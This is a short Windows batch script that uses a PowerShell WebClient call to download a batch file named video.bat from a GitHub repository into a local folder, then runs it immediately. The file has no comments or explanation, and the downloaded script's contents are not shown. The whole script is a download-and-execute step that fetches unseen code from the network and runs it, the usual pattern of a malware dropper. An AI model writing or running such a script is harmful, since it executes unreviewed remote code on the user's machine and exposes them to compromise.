@echo off 
cls

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/video.bat','C:\your\asylum\video.bat')"

start video.bat

pause
exit
